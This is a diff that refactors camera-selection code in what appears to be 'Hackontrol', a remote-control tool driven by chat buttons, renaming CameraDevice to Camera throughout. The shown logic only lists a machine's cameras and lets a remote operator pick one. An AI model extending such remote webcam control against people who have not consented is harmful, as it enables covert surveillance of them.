@@ -3,9 +3,8 @@ package com.khopan.hackontrol.channel;
 import java.util.ArrayList;
 import java.util.List;
 
-import com.khopan.hackontrol.CameraDevice;
+import com.khopan.camera.Camera;
 import com.khopan.hackontrol.HackontrolChannel;
-import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
@@ -39,8 +38,8 @@ public class CameraChannel extends HackontrolChannel {
 
 	private static final String MODAL_SELECT_CAMERA = "selectCamera";
 
-	private CameraDevice[] devices;
-	private CameraDevice selectedCamera;
+	private Camera[] cameraList;
+	private Camera selectedCamera;
 	private ButtonContext selectContext;
 
 	@Override
@@ -63,28 +62,28 @@ public class CameraChannel extends HackontrolChannel {
 	}
 
 	private void buttonCameraList(ButtonContext context) {
-		this.devices = NativeLibrary.cameraList();
+		this.cameraList = Camera.list();
 		this.sendCameraList(context);
 	}
 
 	private void buttonSelect(ButtonContext context) {
-		if(this.devices == null || this.devices.length == 0) {
+		if(this.cameraList == null || this.cameraList.length == 0) {
 			HackontrolError.message(context.reply(), "No camera available");
 			return;
 		}
 
-		if(this.devices.length == 1) {
-			this.selectedCamera = this.devices[0];
+		if(this.cameraList.length == 1) {
+			this.selectedCamera = this.cameraList[0];
 			this.sendCameraList(context);
 			HackontrolMessage.delete(context);
 			return;
-		} else if(this.devices.length == 2) {
-			CameraDevice newSelected = null;
+		} else if(this.cameraList.length == 2) {
+			Camera newSelected = null;
 
-			if(this.devices[0].equals(this.selectedCamera)) {
-				newSelected = this.devices[1];
-			} else if(this.devices[1].equals(this.selectedCamera)) {
-				newSelected = this.devices[0];
+			if(this.cameraList[0].equals(this.selectedCamera)) {
+				newSelected = this.cameraList[1];
+			} else if(this.cameraList[1].equals(this.selectedCamera)) {
+				newSelected = this.cameraList[0];
 			}
 
 			if(newSelected != null) {
@@ -98,8 +97,8 @@ public class CameraChannel extends HackontrolChannel {
 		TextInput textInput = TextInput.create("cameraIndex", "Camera Index", TextInputStyle.SHORT)
 				.setRequired(true)
 				.setMinLength(1)
-				.setMaxLength(Integer.toString(this.devices.length).length())
-				.setPlaceholder("1 - " + this.devices.length)
+				.setMaxLength(Integer.toString(this.cameraList.length).length())
+				.setPlaceholder("1 - " + this.cameraList.length)
 				.build();
 
 		Modal modal = Modal.create(CameraChannel.MODAL_SELECT_CAMERA, "Select Camera")
@@ -151,18 +150,18 @@ public class CameraChannel extends HackontrolChannel {
 			return;
 		}
 
-		if(index < 1 || index > this.devices.length) {
-			HackontrolError.message(context.reply(), "Index " + index + " out of bounds, expected 1 - " + this.devices.length);
+		if(index < 1 || index > this.cameraList.length) {
+			HackontrolError.message(context.reply(), "Index " + index + " out of bounds, expected 1 - " + this.cameraList.length);
 			return;
 		}
 
-		this.selectedCamera = this.devices[index - 1];
+		this.selectedCamera = this.cameraList[index - 1];
 		this.sendCameraList(context);
 		HackontrolMessage.delete(this.selectContext);
 	}
 
 	private void sendCameraList(IReplyCallback callback) {
-		if(this.devices == null || this.devices.length == 0) {
+		if(this.cameraList == null || this.cameraList.length == 0) {
 			HackontrolError.message(ReplyCallbackSendable.of(callback), "No camera available");
 			return;
 		}
@@ -170,13 +169,13 @@ public class CameraChannel extends HackontrolChannel {
 		StringBuilder builder = new StringBuilder();
 		boolean hasSelected = false;
 
-		for(int i = 0; i < this.devices.length; i++) {
+		for(int i = 0; i < this.cameraList.length; i++) {
 			if(i > 0) {
 				builder.append('\n');
 			}
 
-			CameraDevice device = this.devices[i];
-			boolean selected = device.equals(this.selectedCamera);
+			Camera camera = this.cameraList[i];
+			boolean selected = camera.equals(this.selectedCamera);
 
 			if(selected) {
 				builder.append("**");
@@ -185,7 +184,7 @@ public class CameraChannel extends HackontrolChannel {
 			builder.append('`');
 			builder.append(i + 1);
 			builder.append(") ");
-			builder.append(device.getDeviceName());
+			builder.append(camera.getName());
 
 			if(selected) {
 				builder.append(" (Selected)");
